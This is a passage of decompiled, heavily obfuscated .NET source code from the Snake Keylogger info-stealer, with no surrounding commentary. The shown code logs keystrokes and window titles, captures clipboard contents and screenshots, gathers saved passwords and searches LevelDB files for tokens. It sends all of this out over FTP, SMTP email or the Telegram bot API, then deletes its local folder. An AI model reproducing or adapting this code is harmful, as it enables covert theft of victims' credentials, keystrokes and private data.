          Operators.AddObject(Operators.AddObject((object) (Α\uFFFDǎŎ\uFFFD.ݝŴ\uFFFDϘϒ + \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Name + " - Clipboard Logs ID - "), Α\uFFFDǎŎ\uFFFD.鈟㹃ا\u07B9ٷ), (object) Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(Α\uFFFDǎŎ\uFFFD.Α븤\u060C\u00BEŲ, Α\uFFFDǎŎ\uFFFD.ĂՄi\uFFFD\uFFFD);
          byte[] bytes = Encoding.UTF8.GetBytes("Clipboard | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n\r\n\r\n" + Α\uFFFDǎŎ\uFFFD.ᔖׁՕ뜸\uFFFD + "\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(Α\uFFFDǎŎ\uFFFD.ĪƟ̮Юϱ);
          message.To.Add(Α\uFFFDǎŎ\uFFFD.\uFFFDۨ\uFFFD쐬أ);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "Clipboard | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n\r\n";
          MemoryStream contentStream = new MemoryStream(Α\uFFFDǎŎ\uFFFD.å퓜\uFFFDׁ2());
          message.Attachments.Add(new Attachment((Stream) contentStream, "Clipboard" + Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ, "text/plain"));
          new SmtpClient(Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFDƚ\uFFFDz)
          {
            EnableSsl = (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.\u0032ņչ\uFFFD\u07B4, "True", false) == 0),
            Port = Conversions.ToInteger(Α\uFFFDǎŎ\uFFFD.Ɖ\u03852թ\u0609),
            Credentials = ((ICredentialsByHost) new NetworkCredential(Α\uFFFDǎŎ\uFFFD.ĪƟ̮Юϱ, Α\uFFFDǎŎ\uFFFD.åӛϘٵ\u26CA))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = "Clipboard | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n\r\n\r\n" + Α\uFFFDǎŎ\uFFFD.ᔖׁՕ뜸\uFFFD + "\r\n\r\n--------------------------------------------------";
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + Α\uFFFDǎŎ\uFFFD.\uFFFDڿ\u26CAŲå + "/sendDocument?chat_id=" + Α\uFFFDǎŎ\uFFFD.ε\u00ABę2\uFFFD + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nClipboard | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          Α\uFFFDǎŎ\uFFFD.şCЦ丐\u0026("Clipboard" + Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static void \uFFFḎ盀ۣݶ(object _param0, EventArgs _param1)
    {
      string str1 = "Screenshot";
      string str2 = ".png";
      string path = \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.FileSystem.SpecialDirectories.MyDocuments + "\\SnakeKeylogger";
      try
      {
        if (Directory.Exists(path))
        {
          Α\uFFFDǎŎ\uFFFD.\uFFFDۚ\u2964꾯і = \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.FileSystem.SpecialDirectories.MyDocuments + "\\SnakeKeylogger\\" + str1 + str2;
          int width = \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Screen.Bounds.Width;
          Rectangle bounds = \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Screen.Bounds;
          int height = bounds.Height;
          Size blockRegionSize = new Size(width, height);
          bounds = \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Screen.Bounds;
          Bitmap bitmap = new Bitmap(bounds.Width, \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Screen.Bounds.Height);
          Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
          bitmap.Save(Α\uFFFDǎŎ\uFFFD.\uFFFDۚ\u2964꾯і);
          Α\uFFFDǎŎ\uFFFD.\u0314\u02E8Īé㠰();
          Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFD䇹ʭأ();
        }
        else
        {
          Directory.CreateDirectory(path);
          Size blockRegionSize = new Size(\u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Screen.Bounds.Width, \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Screen.Bounds.Height);
          Bitmap bitmap = new Bitmap(\u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Screen.Bounds.Width, \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Screen.Bounds.Height);
          Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
          bitmap.Save(Α\uFFFDǎŎ\uFFFD.\uFFFDۚ\u2964꾯і);
          Α\uFFFDǎŎ\uFFFD.\u0314\u02E8Īé㠰();
          Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFD䇹ʭأ();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u0314\u02E8Īé㠰()
    {
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (Α\uFFFDǎŎ\uFFFD.ݝŴ\uFFFDϘϒ + \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Name + " - Screenshot Logs ID - "), Α\uFFFDǎŎ\uFFFD.鈟㹃ا\u07B9ٷ), (object) ".png")
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(Α\uFFFDǎŎ\uFFFD.Α븤\u060C\u00BEŲ, Α\uFFFDǎŎ\uFFFD.ĂՄi\uFFFD\uFFFD);
          byte[] buffer = System.IO.File.ReadAllBytes(Α\uFFFDǎŎ\uFFFD.\uFFFDۚ\u2964꾯і);
          ftpWebRequest.ContentLength = (long) buffer.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(buffer, 0, buffer.Length);
            requestStream.Close();
            System.IO.File.Delete(Α\uFFFDǎŎ\uFFFD.\uFFFDۚ\u2964꾯і);
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(Α\uFFFDǎŎ\uFFFD.ĪƟ̮Юϱ);
          message.To.Add(Α\uFFFDǎŎ\uFFFD.\uFFFDۨ\uFFFD쐬أ);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "Screenshot | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n\r\n";
          Attachment attachment = new Attachment(Α\uFFFDǎŎ\uFFFD.\uFFFDۚ\u2964꾯і);
          message.Attachments.Add(attachment);
          new SmtpClient(Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFDƚ\uFFFDz)
          {
            EnableSsl = (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.\u0032ņչ\uFFFD\u07B4, "True", false) == 0),
            Port = Conversions.ToInteger(Α\uFFFDǎŎ\uFFFD.Ɖ\u03852թ\u0609),
            Credentials = ((ICredentialsByHost) new NetworkCredential(Α\uFFFDǎŎ\uFFFD.ĪƟ̮Юϱ, Α\uFFFDǎŎ\uFFFD.åӛϘٵ\u26CA))
          }.Send(message);
          message.Dispose();
          Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFD䇹ʭأ();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "$%TelegramDv$", false) == 0)
      {
        try
        {
          byte[] numArray = System.IO.File.ReadAllBytes(Α\uFFFDǎŎ\uFFFD.\uFFFDۚ\u2964꾯і);
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str = "https://api.telegram.org/bot" + Α\uFFFDǎŎ\uFFFD.\uFFFDڿ\u26CAŲå + "/sendDocument?chat_id=" + Α\uFFFDǎŎ\uFFFD.ε\u00ABę2\uFFFD + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nScreenshot | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n\r\n");
          Α\uFFFDǎŎ\uFFFD.ϱʪ븤œױ(numArray, Α\uFFFDǎŎ\uFFFD.\uFFFDۚ\u2964꾯і, "application/x-ms-dos-executable", str);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static void \uFFFD\uFFFD䇹ʭأ()
    {
      int num1;
      int num2;
      try
      {
label_2:
        int num3 = 1;
        string path = \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.FileSystem.SpecialDirectories.MyDocuments + "\\SnakeKeylogger";
label_3:
        ProjectData.ClearProjectError();
        num1 = -2;
label_4:
        num3 = 3;
        if (!Directory.Exists(path))
          goto label_7;
label_5:
        num3 = 4;
        Directory.Delete(path, true);
label_6:
label_7:
        goto label_14;
label_9:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
                goto label_5;
              case 5:
                goto label_6;
              case 6:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static byte[] ӤZƟۨӛ() => Encoding.Unicode.GetBytes("KP | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n\r\n\r\n" + Α\uFFFDǎŎ\uFFFD.ɮݶԌεױ.ToString() + "\r\n\r\n\r\n--------------------------------------------------");

    private static void ƌ鈟\uFFFD\uFFFD\uFFFD(object _param0, EventArgs _param1)
    {
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (Α\uFFFDǎŎ\uFFFD.ݝŴ\uFFFDϘϒ + \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Name + " - keystroke Logs ID - "), Α\uFFFDǎŎ\uFFFD.鈟㹃ا\u07B9ٷ), (object) Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(Α\uFFFDǎŎ\uFFFD.Α븤\u060C\u00BEŲ, Α\uFFFDǎŎ\uFFFD.ĂՄi\uFFFD\uFFFD);
          byte[] bytes = Encoding.UTF8.GetBytes("KP | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n\r\n\r\n" + Α\uFFFDǎŎ\uFFFD.ɮݶԌεױ.ToString() + "\r\n\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
            Α\uFFFDǎŎ\uFFFD.\u05C1z盀蠺̔ = "";
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(Α\uFFFDǎŎ\uFFFD.ĪƟ̮Юϱ);
          message.To.Add(Α\uFFFDǎŎ\uFFFD.\uFFFDۨ\uFFFD쐬أ);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          MemoryStream contentStream = new MemoryStream(Α\uFFFDǎŎ\uFFFD.ӤZƟۨӛ());
          message.Attachments.Add(new Attachment((Stream) contentStream, "Keystrokes" + Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ, "text/plain"));
          message.Body = "KP | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          new SmtpClient(Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFDƚ\uFFFDz)
          {
            EnableSsl = (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.\u0032ņչ\uFFFD\u07B4, "True", false) == 0),
            Port = Conversions.ToInteger(Α\uFFFDǎŎ\uFFFD.Ɖ\u03852թ\u0609),
            Credentials = ((ICredentialsByHost) new NetworkCredential(Α\uFFFDǎŎ\uFFFD.ĪƟ̮Юϱ, Α\uFFFDǎŎ\uFFFD.åӛϘٵ\u26CA))
          }.Send(message);
          message.Dispose();
          Α\uFFFDǎŎ\uFFFD.\u05C1z盀蠺̔ = "";
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = "Keylogger | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n\r\n\r\n" + Α\uFFFDǎŎ\uFFFD.ɮݶԌεױ.ToString() + "\r\n\r\n\r\n--------------------------------------------------";
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + Α\uFFFDǎŎ\uFFFD.\uFFFDڿ\u26CAŲå + "/sendDocument?chat_id=" + Α\uFFFDǎŎ\uFFFD.ε\u00ABę2\uFFFD + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nKeylogger | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          Α\uFFFDǎŎ\uFFFD.şCЦ丐\u0026("SnakeKeylogger" + Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    private static void ʪʓˤ恁Ω(object 뜸کޗި恁, Α\uFFFDǎŎ\uFFFD.KeyLoggerEventArgs _param1)
    {
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.ϒmŧ̳鈟, Α\uFFFDǎŎ\uFFFD.Ŕ\u0089ג㹃Ɖ.CurrentWindow, false) != 0)
      {
        Α\uFFFDǎŎ\uFFFD.ϒmŧ̳鈟 = Α\uFFFDǎŎ\uFFFD.Ŕ\u0089ג㹃Ɖ.CurrentWindow;
        Α\uFFFDǎŎ\uFFFD.c\u005EݶÒé(string.Format("\r\n[ -- {0} -- ]\r\n", (object) Α\uFFFDǎŎ\uFFFD.Ŕ\u0089ג㹃Ɖ.CurrentWindow));
      }
      Α\uFFFDǎŎ\uFFFD.c\u005EݶÒé(string.Format("{0}", (object) _param1.StringValue));
    }

    private static void Ų\uFFFD\uFFFDɢC(object Uɢŧ皍ջ, Α\uFFFDǎŎ\uFFFD.KeyLoggerEventArgs _param1) => Α\uFFFDǎŎ\uFFFD.c\u005EݶÒé(string.Format("{0}", (object) _param1.StringValue));

    private static void c\u005EݶÒé(string _param0) => Α\uFFFDǎŎ\uFFFD.ɮݶԌεױ.Append(_param0);

    [DllImport("user32.dll", EntryPoint = "GetForegroundWindow")]
    public static extern IntPtr \uFFFD\uFFFD\uFFFD\uFFFDک();

    [DllImport("user32.dll", EntryPoint = "GetWindowText")]
    public static extern int \u061D\uFFFDĂ߂߂(IntPtr یۨ恁ٚҏ, StringBuilder _param1, int _param2);

    [DllImport("ntdll.dll", EntryPoint = "Wekakekakd", SetLastError = true)]
    public static extern int \u05C9\uFFFDϫУթ(
      IntPtr _param0,
      int _param1,
      ref int ƚRtɛۚ,
      int _param3);

    [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ŲأϘ̔퓜(IntPtr _param0, ref int _param1);

    [DllImport("user32", EntryPoint = "GetKeyboardLayout", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int \u065A츠ʭ\u26CAǎ(int ɛ鈟ˤЦꓞ);

    [DllImport("user32.dll", EntryPoint = "ToUnicodeEx")]
    public static extern int ƚܣŁœ̮(
      uint _param0,
      uint _param1,
      byte[] _param2,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder _param3,
      int _param4,
      uint _param5,
      IntPtr _param6);

    [DllImport("user32.dll", EntryPoint = "GetKeyboardState")]
    public static extern bool \uFFFDŧWٷ\u1CFC(byte[] _param0);

    [DllImport("user32.dll", EntryPoint = "MapVirtualKey")]
    public static extern uint \uD911\uDDCF\u05C9ƜΠ(uint _param0, uint _param1);

    private static void å\u1CFCі\uFFFD\u07BB()
    {
      ThreadStart start;
      // ISSUE: reference to a compiler-generated field
      if (Α\uFFFDǎŎ\uFFFD._Closure\u0024__.\u0024I106\u002D0 != null)
      {
        // ISSUE: reference to a compiler-generated field
        start = Α\uFFFDǎŎ\uFFFD._Closure\u0024__.\u0024I106\u002D0;
      }
      else
      {
        // ISSUE: reference to a compiler-generated field
        Α\uFFFDǎŎ\uFFFD._Closure\u0024__.\u0024I106\u002D0 = start = (ThreadStart) (() =>
        {
          Α\uFFFDǎŎ\uFFFD.Ŕ\u0089ג㹃Ɖ = new Α\uFFFDǎŎ\uFFFD.KeyLogger();
          Α\uFFFDǎŎ\uFFFD.Ŕ\u0089ג㹃Ɖ.KeyDown += new Α\uFFFDǎŎ\uFFFD.KeyLoggerEventArgsEventHandler(Α\uFFFDǎŎ\uFFFD.ʪʓˤ恁Ω);
          Α\uFFFDǎŎ\uFFFD.Ŕ\u0089ג㹃Ɖ.KeyUp += new Α\uFFFDǎŎ\uFFFD.KeyLoggerEventArgsEventHandler(Α\uFFFDǎŎ\uFFFD.Ų\uFFFD\uFFFDɢC);
          Application.Run();
        });
      }
      new Thread(start).Start();
    }

    public static byte[] \uFFFD\u0385\uFFFD\uFFFDᔖ() => Encoding.Unicode.GetBytes(Α\uFFFDǎŎ\uFFFD.ƌŚ̮ٚƌ("PW | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n" + Α\uFFFDǎŎ\uFFFD.ŲЮݝœ\uFFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFDҢ똛Ӥ));

    public static byte[] ÒɇЮЮŁ() => Encoding.Default.GetBytes(Α\uFFFDǎŎ\uFFFD.ƌŚ̮ٚƌ("PW | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n" + Α\uFFFDǎŎ\uFFFD.ŲЮݝœ\uFFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFDҢ똛Ӥ));

    private static void 㹃kë\uFFFDב(object _param0, EventArgs _param1)
    {
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (Α\uFFFDǎŎ\uFFFD.ݝŴ\uFFFDϘϒ + \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Name + " - Passwords ID - "), Α\uFFFDǎŎ\uFFFD.鈟㹃ا\u07B9ٷ), (object) Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(Α\uFFFDǎŎ\uFFFD.Α븤\u060C\u00BEŲ, Α\uFFFDǎŎ\uFFFD.ĂՄi\uFFFD\uFFFD);
          byte[] bytes = Encoding.UTF8.GetBytes(Α\uFFFDǎŎ\uFFFD.ƌŚ̮ٚƌ("PW | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n" + Α\uFFFDǎŎ\uFFFD.ŲЮݝœ\uFFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFDҢ똛Ӥ));
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(Α\uFFFDǎŎ\uFFFD.ĪƟ̮Юϱ);
          message.To.Add(Α\uFFFDǎŎ\uFFFD.\uFFFDۨ\uFFFD쐬أ);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          byte[] buffer1 = Α\uFFFDǎŎ\uFFFD.\uFFFD\u0385\uFFFD\uFFFDᔖ();
          byte[] buffer2 = Α\uFFFDǎŎ\uFFFD.ÒɇЮЮŁ();
          MemoryStream contentStream1 = new MemoryStream(buffer1);
          MemoryStream contentStream2 = new MemoryStream(buffer2);
          message.Attachments.Add(new Attachment((Stream) contentStream1, "Passwords" + Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ, "text/plain"));
          message.Attachments.Add(new Attachment((Stream) contentStream2, "User" + Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ, "text/plain"));
          new SmtpClient(Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFDƚ\uFFFDz)
          {
            EnableSsl = (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.\u0032ņչ\uFFFD\u07B4, "True", false) == 0),
            Port = Conversions.ToInteger(Α\uFFFDǎŎ\uFFFD.Ɖ\u03852թ\u0609),
            Credentials = ((ICredentialsByHost) new NetworkCredential(Α\uFFFDǎŎ\uFFFD.ĪƟ̮Юϱ, Α\uFFFDǎŎ\uFFFD.åӛϘٵ\u26CA))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = Α\uFFFDǎŎ\uFFFD.ƌŚ̮ٚƌ("PW | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n" + Α\uFFFDǎŎ\uFFFD.ŲЮݝœ\uFFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFDҢ똛Ӥ);
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + Α\uFFFDǎŎ\uFFFD.\uFFFDڿ\u26CAŲå + "/sendDocument?chat_id=" + Α\uFFFDǎŎ\uFFFD.ε\u00ABę2\uFFFD + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          Α\uFFFDǎŎ\uFFFD.ӛ\uFFFD\uFFFD\u07BBÒ("SnakePW" + Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    private static bool ʤԜJζ\uFFFD(ref string _param0)
    {
      bool flag;
      if (Directory.Exists(_param0))
      {
        FileInfo[] files = new DirectoryInfo(_param0).GetFiles();
        int index = 0;
        while (index < files.Length)
        {
          FileInfo fileInfo = files[index];
          if (fileInfo.Name.EndsWith(".ldb") && System.IO.File.ReadAllText(fileInfo.FullName).Contains("oken"))
          {
            _param0 += fileInfo.Name;
            return _param0.EndsWith(".ldb");
          }
          checked { ++index; }
        }
        flag = _param0.EndsWith(".ldb");
      }
      else
        flag = false;
      return flag;
    }

    private static string Ŵ\u061Dҭ盀츠(string _param0)
    {
      string[] collection = _param0.Substring(checked (_param0.IndexOf("oken") + 4)).Split('"');
      List<string> stringList = new List<string>();
      stringList.AddRange((IEnumerable<string>) collection);
      stringList.RemoveAt(0);
      return string.Join("\"", stringList.ToArray());
    }

    private static string 콪̀\uDA3B\uDDCFë(string _param0, bool _param1 = false)
    {
      string str1 = Encoding.UTF8.GetString(System.IO.File.ReadAllBytes(_param0));
      string str2 = "";
      string str3 = str1;
      while (str3.Contains("oken"))
      {
        string[] strArray = Α\uFFFDǎŎ\uFFFD.Ŵ\u061Dҭ盀츠(str3).Split('"');
        str2 = strArray[0];
        str3 = string.Join("\"", strArray);
        if (_param1 && str2.Length == 59)
          break;
      }
      return str2;
    }

    public static void Ԝ\u07B8ēջ콪()
    {
      if (Operators.CompareString(Α\uFFFDǎŎ\uFFFD.AƟzş2, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (Α\uFFFDǎŎ\uFFFD.ݝŴ\uFFFDϘϒ + \u07B8\uF0B9Ųӛé.\u1CFC븤\uFFFD̲Ś.Name + " - Passwords ID - "), Α\uFFFDǎŎ\uFFFD.鈟㹃ا\u07B9ٷ), (object) Α\uFFFDǎŎ\uFFFD.kٕ꼺ЦŲ)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(Α\uFFFDǎŎ\uFFFD.Α븤\u060C\u00BEŲ, Α\uFFFDǎŎ\uFFFD.ĂՄi\uFFFD\uFFFD);
          byte[] bytes = Encoding.UTF8.GetBytes(Α\uFFFDǎŎ\uFFFD.ƌŚ̮ٚƌ("PW | " + Environment.UserName + " | Snake\r\n" + Α\uFFFDǎŎ\uFFFD.\uFFFDʪջ\uFFFD鈟 + "\r\n" + Α\uFFFDǎŎ\uFFFD.ŲЮݝœ\uFFFD + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFDҢ똛Ӥ));
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
